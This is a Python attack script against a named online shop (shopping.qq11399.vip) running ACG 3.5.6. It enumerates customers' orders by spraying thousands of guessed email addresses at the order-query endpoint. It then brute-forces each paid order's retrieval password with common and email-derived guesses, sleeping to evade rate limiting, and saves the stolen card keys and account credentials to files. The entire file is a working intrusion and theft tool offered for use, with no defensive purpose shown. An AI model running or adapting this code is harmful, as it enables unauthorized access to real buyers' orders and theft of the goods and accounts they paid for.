#!/usr/bin/env python3
"""shopping.qq11399.vip (太白) email contact spray — ACG 3.5.6 guest+email."""
import json, os, re, threading, time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests, urllib3
urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/workspace/qq11388/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = os.environ.get("BASE") or "https://shopping.qq11399.vip"
WORKERS = int(os.environ.get("WORKERS") or "8")
MAX_N = int(os.environ.get("MAX_N") or "9999")

lock = threading.Lock()
tls = threading.local()
stats = {"done": 0, "hits": 0, "orders": 0, "kami": 0, "acc": 0, "errors": 0, "throttle": 0}
seen_tn, kami_tn = set(), set()
kami_rows, hit_orders, accounts = [], [], set()

def log(*a): print(*a, flush=True)
def S():
    s = getattr(tls, "s", None)
    if not s:
        s = requests.Session(); s.verify = False
        s.headers.update({"User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest","Origin":B,"Referer":B+"/user/index/query"})
        tls.s = s
    return s
def cards(secret):
    blob = str(secret or "").replace("<br/>","\n").replace("<br>","\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]
def save():
    (OUT/"contact_state.json").write_text(json.dumps(stats, ensure_ascii=False))
    (OUT/"contact_kami.json").write_text(json.dumps(kami_rows, ensure_ascii=False, indent=2))
    (OUT/"contact_hits.json").write_text(json.dumps(hit_orders, ensure_ascii=False, indent=2))
    (OUT/"contact_accounts.txt").write_text("\n".join(sorted(accounts))+("\n" if accounts else ""))
def extract(j):
    if not isinstance(j, dict) or j.get("code") != 200: return []
    data = j.get("data")
    if isinstance(data, list): return data
    if isinstance(data, dict): return data.get("list") or []
    return []

PWS = ["","123456","000000","123123","111111","12345678","666666","888888","abcdef","abc123","112233","123321","654321","5201314","password","qwerty","qq123456","147258","aaaaaa","woaini"]

def fetch_secret(tn, kw):
    local = str(kw).split("@")[0]
    pws = [local, "123456", str(kw), local+"123", local+"456"] + PWS
    seen=set()
    for pw in pws:
        if pw in seen: continue
        seen.add(pw)
        for field in ("tradeNo", "orderId"):
            try:
                j = S().post(B+"/user/api/index/secret", data={field: tn, "password": pw}, timeout=12).json()
            except Exception:
                continue
            if j.get("code")==200 and j.get("data"):
                d=j["data"]; return (d.get("secret") if isinstance(d,dict) else d), pw, field
            msg=str(j.get("msg") or "")
            if "频繁" in msg:
                time.sleep(12); continue
            if "还未支付" in msg:
                return None, None, None
            if "密码错误" in msg:
                break
    return None, None, None

def handle(kw, orders):
    with lock: stats["hits"] += 1
    for od in orders:
        tn = od.get("trade_no")
        with lock:
            if tn and tn not in seen_tn:
                seen_tn.add(tn); od=dict(od); od["_query_kw"]=kw; hit_orders.append(od); stats["orders"]=len(seen_tn); save()
        if od.get("status") != 1 or not tn or tn in kami_tn: continue
        # secret in list?
        sec = od.get("secret")
        if sec and od.get("password") not in (True,1,"1"):
            cs=cards(sec)
            row={"trade_no":tn,"query_kw":kw,"password":None,"amount":od.get("amount"),"contact":od.get("contact"),"secret":sec,"cards":cs,"card_count":len(cs),"source":"query_list"}
            with lock:
                kami_rows.append(row); kami_tn.add(tn); stats["kami"]=len(kami_rows)
                for c in cs: accounts.add(c)
                stats["acc"]=len(accounts); save()
            log("KAMI_LIST", tn, len(cs)); continue
        secret, pw, field = fetch_secret(tn, od.get("contact") or kw)
        if not secret: continue
        cs=cards(secret)
        row={"trade_no":tn,"query_kw":kw,"password":pw,"secret_field":field,"amount":od.get("amount"),"contact":od.get("contact"),"pay_time":od.get("pay_time"),"commodity_id":od.get("commodity_id"),"secret":secret,"cards":cs,"card_count":len(cs)}
        with lock:
            kami_rows.append(row); kami_tn.add(tn); stats["kami"]=len(kami_rows)
            for c in cs: accounts.add(c)
            stats["acc"]=len(accounts); save()
        log("KAMI", tn, "kw", kw, "pw", pw, "cards", len(cs), "amount", od.get("amount"))

def work(kw):
    kw=str(kw)
    try:
        j=S().post(B+"/user/api/index/query", data={"keywords":kw}, timeout=12).json()
    except Exception:
        with lock: stats["errors"]+=1; stats["done"]+=1
        return
    msg=str(j.get("msg") or "")
    if "频繁" in msg:
        with lock: stats["throttle"]+=1
        time.sleep(15); return work(kw)
    orders=[x for x in extract(j) if isinstance(x,dict)]
    with lock:
        stats["done"]+=1
        if stats["done"]%500==0: log("progress", stats, "kw", kw); save()
    if orders:
        log("HIT", kw, "n", len(orders), "paid", sum(1 for o in orders if o.get("status")==1))
        handle(kw, orders)

def wordlist():
    locals_=["123","1234","12345","123456","123123","12323","111111","000000","666666","888888","112233","5201314","1314","10086","10010","admin","test","qq","qq123","qq888","a","aa","aaa","abc","abcd","abcdef","1","11","111","12","666","888","999","taibai","tb","qq11388","qq11399","147258","1314520","7758521","email","mail","user","guest","aa123456","abc123","qwe","asd","zxc","love","iloveyou","woaini"]
    domains=["qq.com","163.com","126.com","gmail.com","foxmail.com","outlook.com","yeah.net","139.com","sina.com","vip.qq.com","88.com"]
    words=[]
    for loc in locals_:
        for d in domains: words.append(f"{loc}@{d}")
    for i in range(1, MAX_N+1):
        words.append(f"{i}@qq.com")
        if i <= 3000:
            words.append(f"{i}@163.com"); words.append(f"{i}@126.com")
    seen,out=set(),[]
    for w in words:
        if w not in seen: seen.add(w); out.append(w)
    return out

def main():
    words=wordlist(); log("words", len(words), "workers", WORKERS, "base", B)
    t0=time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, words, chunksize=16))
    save(); log("DONE", stats, "sec", int(time.time()-t0))

if __name__ == "__main__":
    main()
